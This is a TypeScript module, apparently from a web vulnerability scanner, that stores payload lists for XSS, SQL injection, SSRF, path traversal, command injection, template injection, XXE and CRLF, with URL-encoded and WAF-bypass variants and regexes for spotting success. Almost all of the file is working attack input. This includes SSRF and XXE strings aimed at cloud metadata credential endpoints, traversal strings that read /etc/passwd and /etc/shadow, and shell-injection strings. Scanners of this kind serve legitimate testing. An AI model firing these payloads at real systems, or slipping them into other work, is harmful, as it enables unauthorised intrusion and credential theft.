/**
 * Payload Database (Phase 20D)
 *
 * Curated, high-quality payload collections per vulnerability type.
 * Quality over quantity — each payload is selected for maximum detection
 * probability with minimum false positives.
 */

// ─── Types ───────────────────────────────────────────────────────────────────

export type VulnType = 'xss' | 'sqli' | 'ssrf' | 'path_traversal' | 'command_injection' | 'ssti' | 'xxe' | 'crlf';

export interface Payload {
  raw: string;
  encoded: string[];
  wafBypass: string[];
  description: string;
  vulnType: VulnType;
  expectedIndicator: string;
}

// ─── Helper ─────────────────────────────────────────────────────────────────

function urlEncode(s: string): string {
  return encodeURIComponent(s);
}

function doubleEncode(s: string): string {
  return encodeURIComponent(encodeURIComponent(s));
}

function makePayload(
  raw: string,
  vulnType: VulnType,
  description: string,
  expectedIndicator: string,
  wafBypass: string[] = [],
): Payload {
  return {
    raw,
    encoded: [urlEncode(raw), doubleEncode(raw)],
    wafBypass,
    description,
    vulnType,
    expectedIndicator,
  };
}

// ─── XSS Payloads ───────────────────────────────────────────────────────────

const XSS_PAYLOADS: Payload[] = [
  // Basic reflection tests
  makePayload('<script>alert(1)</script>', 'xss', 'Basic script tag', '<script>alert\\(1\\)</script>', ['<ScRiPt>alert(1)</ScRiPt>', '<script >alert(1)</script >']),
  makePayload('<img src=x onerror=alert(1)>', 'xss', 'IMG onerror', '<img src=x onerror=', ['<img/src=x onerror=alert(1)>', '<iMg src=x onerror=alert(1)>']),
  makePayload('"><svg/onload=alert(1)>', 'xss', 'SVG onload breaking attribute', '<svg/onload=alert\\(1\\)>', ['"><svg/onload=alert&#40;1&#41;>']),
  makePayload("'><script>alert(1)</script>", 'xss', 'Single quote breakout', '<script>alert\\(1\\)</script>', []),
  makePayload('<body onload=alert(1)>', 'xss', 'Body onload', '<body onload=', []),
  makePayload('<details open ontoggle=alert(1)>', 'xss', 'Details ontoggle', '<details open ontoggle=', []),
  makePayload('<iframe src="javascript:alert(1)">', 'xss', 'Iframe javascript URI', 'javascript:alert', []),
  makePayload('"><img src=x onerror=alert(document.domain)>', 'xss', 'Document domain exfil', 'onerror=alert\\(document\\.domain\\)', []),
  makePayload('<svg><script>alert(1)</script></svg>', 'xss', 'SVG script tag', '<script>alert\\(1\\)</script>', []),
  makePayload('javascript:alert(1)//', 'xss', 'JavaScript protocol', 'javascript:alert', []),
  makePayload('<input onfocus=alert(1) autofocus>', 'xss', 'Input autofocus', 'onfocus=alert', []),
  makePayload('<marquee onstart=alert(1)>', 'xss', 'Marquee onstart', 'onstart=alert', []),
  makePayload('<video><source onerror=alert(1)>', 'xss', 'Video source onerror', 'onerror=alert', []),
  makePayload('<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">', 'xss', 'Nested tag confusion', 'onerror=alert', []),
  // Template literal
  makePayload('${alert(1)}', 'xss', 'Template literal injection', '\\$\\{alert', []),
  // DOM XSS probes
  makePayload('#<img src=x onerror=alert(1)>', 'xss', 'Fragment-based DOM XSS', 'onerror=alert', []),
  // Polyglot
  makePayload("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", 'xss', 'XSS polyglot', 'oNcliCk=alert', []),
  // Event handlers
  makePayload('<div onmouseover="alert(1)">HOVER</div>', 'xss', 'Mouseover handler', 'onmouseover=', []),
  makePayload('<a href="javascript:alert(1)">click</a>', 'xss', 'Anchor javascript href', 'javascript:alert', []),
  makePayload('<form><button formaction=javascript:alert(1)>X</button></form>', 'xss', 'Form button action', 'javascript:alert', []),
];

// ─── SQLi Payloads ──────────────────────────────────────────────────────────

const SQLI_PAYLOADS: Payload[] = [
  // Error-based
  makePayload("'", 'sqli', 'Single quote error probe', 'SQL syntax|mysql|PostgreSQL|ORA-|SQLSTATE|unclosed quotation', []),
  makePayload('"', 'sqli', 'Double quote error probe', 'SQL syntax|mysql|PostgreSQL|ORA-|SQLSTATE', []),
  makePayload("' OR '1'='1", 'sqli', 'Boolean tautology (single quote)', "OR '1'='1", []),
  makePayload('" OR "1"="1', 'sqli', 'Boolean tautology (double quote)', 'OR "1"="1', []),
  makePayload("' OR 1=1--", 'sqli', 'Boolean tautology with comment', 'OR 1=1', ['/*!50000OR*/ 1=1--']),
  makePayload("1' AND 1=CONVERT(int,'a')--", 'sqli', 'MSSQL CONVERT error', 'CONVERT|conversion failed|nvarchar', []),
  makePayload("1 AND 1=1", 'sqli', 'Numeric boolean true', '', []),
  makePayload("1 AND 1=2", 'sqli', 'Numeric boolean false (compare with true)', '', []),
  // Union-based
  makePayload("' UNION SELECT NULL--", 'sqli', 'Union null single column', 'UNION', ["' /*!50000UNION*/ SELECT NULL--"]),
  makePayload("' UNION SELECT NULL,NULL--", 'sqli', 'Union null two columns', 'UNION', []),
  makePayload("' UNION SELECT NULL,NULL,NULL--", 'sqli', 'Union null three columns', 'UNION', []),
  makePayload("' UNION SELECT 1,2,3--", 'sqli', 'Union numeric columns', 'UNION', []),
  // Time-based blind
  makePayload("' AND SLEEP(5)--", 'sqli', 'MySQL time-based blind (5s delay)', '', ["' AND SLEEP(5)#"]),
  makePayload("'; WAITFOR DELAY '00:00:05'--", 'sqli', 'MSSQL time-based blind', '', []),
  makePayload("' AND pg_sleep(5)--", 'sqli', 'PostgreSQL time-based blind', '', []),
  makePayload("1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 'sqli', 'PostgreSQL conditional delay', '', []),
  // Stacked queries
  makePayload("'; SELECT 1--", 'sqli', 'Stacked query test', '', []),
  // Error-based extraction
  makePayload("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", 'sqli', 'MySQL error extraction', 'XPATH syntax|EXTRACTVALUE', []),
  makePayload("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", 'sqli', 'MySQL error via GROUP BY', 'Duplicate entry', []),
];

// ─── SSRF Payloads ──────────────────────────────────────────────────────────

const SSRF_PAYLOADS: Payload[] = [
  makePayload('http://169.254.169.254/latest/meta-data/', 'ssrf', 'AWS metadata endpoint', 'ami-id|instance-id|iam', []),
  makePayload('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'ssrf', 'AWS IAM credentials', 'AccessKeyId|SecretAccessKey', []),
  makePayload('http://metadata.google.internal/computeMetadata/v1/', 'ssrf', 'GCP metadata endpoint', 'attributes|instance', []),
  makePayload('http://169.254.169.254/metadata/v1/', 'ssrf', 'DigitalOcean metadata', 'droplet_id|hostname', []),
  makePayload('http://127.0.0.1', 'ssrf', 'Localhost via IPv4', '', []),
  makePayload('http://[::1]', 'ssrf', 'Localhost via IPv6', '', []),
  makePayload('http://0x7f000001', 'ssrf', 'Localhost via hex IP', '', []),
  makePayload('http://0177.0.0.1', 'ssrf', 'Localhost via octal IP', '', []),
  makePayload('http://127.0.0.1:22', 'ssrf', 'Internal SSH port', 'SSH|OpenSSH|refused', []),
  makePayload('http://127.0.0.1:3306', 'ssrf', 'Internal MySQL port', 'mysql|MariaDB', []),
  makePayload('http://127.0.0.1:6379', 'ssrf', 'Internal Redis port', 'REDIS|redis_version', []),
  makePayload('http://127.0.0.1:9200', 'ssrf', 'Internal Elasticsearch', 'elasticsearch|cluster_name', []),
  makePayload('file:///etc/passwd', 'ssrf', 'File protocol /etc/passwd', 'root:.*:0:0', []),
  makePayload('http://169.254.169.254/latest/user-data/', 'ssrf', 'AWS user-data', '', []),
];

// ─── Path Traversal Payloads ────────────────────────────────────────────────

const PATH_TRAVERSAL_PAYLOADS: Payload[] = [
  makePayload('../../../etc/passwd', 'path_traversal', 'Unix passwd (3 levels)', 'root:.*:0:0', ['..%2f..%2f..%2fetc%2fpasswd']),
  makePayload('../../../../etc/passwd', 'path_traversal', 'Unix passwd (4 levels)', 'root:.*:0:0', ['....//....//....//....//etc/passwd']),
  makePayload('../../../../../etc/passwd', 'path_traversal', 'Unix passwd (5 levels)', 'root:.*:0:0', []),
  makePayload('..\\..\\..\\windows\\win.ini', 'path_traversal', 'Windows win.ini', '\\[fonts\\]|\\[extensions\\]', ['..%5c..%5c..%5cwindows%5cwin.ini']),
  makePayload('/etc/passwd', 'path_traversal', 'Absolute path /etc/passwd', 'root:.*:0:0', []),
  makePayload('....//....//....//etc/passwd', 'path_traversal', 'Double-dot-slash bypass', 'root:.*:0:0', []),
  makePayload('..%252f..%252f..%252fetc/passwd', 'path_traversal', 'Double URL encode', 'root:.*:0:0', []),
  makePayload('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'path_traversal', 'Full URL encode', 'root:.*:0:0', []),
  makePayload('../../../etc/shadow', 'path_traversal', 'Unix shadow file', 'root:\\$|\\$6\\$|\\$5\\$', []),
  makePayload('../../../proc/self/environ', 'path_traversal', 'Process environment', 'PATH=|HOME=|USER=', []),
  makePayload('..%00/etc/passwd', 'path_traversal', 'Null byte bypass', 'root:.*:0:0', []),
];

// ─── Command Injection Payloads ─────────────────────────────────────────────

const COMMAND_INJECTION_PAYLOADS: Payload[] = [
  makePayload('; id', 'command_injection', 'Semicolon + id', 'uid=\\d+', []),
  makePayload('| id', 'command_injection', 'Pipe + id', 'uid=\\d+', []),
  makePayload('`id`', 'command_injection', 'Backtick id', 'uid=\\d+', []),
  makePayload('$(id)', 'command_injection', 'Subshell id', 'uid=\\d+', []),
  makePayload('; cat /etc/passwd', 'command_injection', 'Cat passwd', 'root:.*:0:0', []),
  makePayload('| cat /etc/passwd', 'command_injection', 'Pipe cat passwd', 'root:.*:0:0', []),
  makePayload('; whoami', 'command_injection', 'Semicolon whoami', 'www-data|root|nobody|\\w+', []),
  makePayload('& whoami', 'command_injection', 'Ampersand whoami', 'www-data|root|nobody|\\w+', []),
  makePayload('; sleep 5', 'command_injection', 'Time-based (5s sleep)', '', []),
  makePayload('| sleep 5', 'command_injection', 'Pipe time-based', '', []),
  makePayload('; ping -c 3 127.0.0.1', 'command_injection', 'Ping confirmation', 'bytes from|icmp_seq', []),
  makePayload("'; id; '", 'command_injection', 'Quote breakout + id', 'uid=\\d+', []),
  makePayload('"; id; "', 'command_injection', 'Double quote breakout', 'uid=\\d+', []),
  makePayload("\\nid\\n", 'command_injection', 'Newline injection', 'uid=\\d+', []),
];

// ─── SSTI Payloads ──────────────────────────────────────────────────────────

const SSTI_PAYLOADS: Payload[] = [
  makePayload('{{7*7}}', 'ssti', 'Jinja2/Twig math eval', '49', []),
  makePayload('${7*7}', 'ssti', 'Freemarker/Mako math eval', '49', []),
  makePayload('#{7*7}', 'ssti', 'Ruby ERB math eval', '49', []),
  makePayload('<%= 7*7 %>', 'ssti', 'ERB math eval', '49', []),
  makePayload('{{config}}', 'ssti', 'Jinja2 config access', 'SECRET_KEY|DEBUG', []),
  makePayload('{{self.__class__}}', 'ssti', 'Jinja2 class introspection', 'TemplateReference|class', []),
  makePayload("{{''.__class__.__mro__}}", 'ssti', 'Jinja2 MRO chain', 'str|object|type', []),
  makePayload('${T(java.lang.Runtime).getRuntime()}', 'ssti', 'Spring EL runtime', 'Runtime|Process', []),
  makePayload("{{request.application.__globals__.__builtins__}}", 'ssti', 'Flask builtins access', 'function|module', []),
  makePayload("{{7*'7'}}", 'ssti', 'Jinja2 string multiplication', '7777777', []),
  makePayload('<%=7*7%>', 'ssti', 'Slim/ERB test', '49', []),
  makePayload('{{constructor.constructor("return this")()}}}', 'ssti', 'JS prototype chain', 'Window|global', []),
];

// ─── XXE Payloads ───────────────────────────────────────────────────────────

const XXE_PAYLOADS: Payload[] = [
  makePayload('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', 'xxe', 'Classic XXE /etc/passwd', 'root:.*:0:0', []),
  makePayload('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', 'xxe', 'XXE /etc/hostname', '', []),
  makePayload('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', 'xxe', 'XXE SSRF to AWS metadata', 'ami-id|instance-id', []),
  makePayload('<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', 'xxe', 'XXE Windows win.ini', '\\[fonts\\]|\\[extensions\\]', []),
];

// ─── CRLF Payloads ──────────────────────────────────────────────────────────

const CRLF_PAYLOADS: Payload[] = [
  makePayload('%0d%0aX-Injected: true', 'crlf', 'CRLF header injection (URL encoded)', 'X-Injected: true', ['%0d%0aX-Injected:%20true']),
  makePayload('\r\nX-Injected: true', 'crlf', 'CRLF header injection (raw)', 'X-Injected: true', []),
  makePayload('%0d%0aSet-Cookie: injected=true', 'crlf', 'CRLF cookie injection', 'Set-Cookie: injected', []),
  makePayload('%0d%0a%0d%0a<script>alert(1)</script>', 'crlf', 'CRLF to XSS via response splitting', '<script>alert', []),
  makePayload('%0aX-Injected: true', 'crlf', 'LF-only injection', 'X-Injected: true', []),
];

// ─── Payload Registry ───────────────────────────────────────────────────────

const PAYLOAD_MAP: Record<VulnType, Payload[]> = {
  xss: XSS_PAYLOADS,
  sqli: SQLI_PAYLOADS,
  ssrf: SSRF_PAYLOADS,
  path_traversal: PATH_TRAVERSAL_PAYLOADS,
  command_injection: COMMAND_INJECTION_PAYLOADS,
  ssti: SSTI_PAYLOADS,
  xxe: XXE_PAYLOADS,
  crlf: CRLF_PAYLOADS,
};

export function getPayloads(vulnType: VulnType): Payload[] {
  return PAYLOAD_MAP[vulnType] ?? [];
}

export function getPayloadsForWaf(vulnType: VulnType, _wafType: string): Payload[] {
  // Return payloads with WAF bypass variants prioritized
  const payloads = getPayloads(vulnType);
  const withBypass = payloads.filter(p => p.wafBypass.length > 0);
  const without = payloads.filter(p => p.wafBypass.length === 0);
  return [...withBypass, ...without];
}

export function getAllVulnTypes(): VulnType[] {
  return ['xss', 'sqli', 'ssrf', 'path_traversal', 'command_injection', 'ssti', 'xxe', 'crlf'];
}
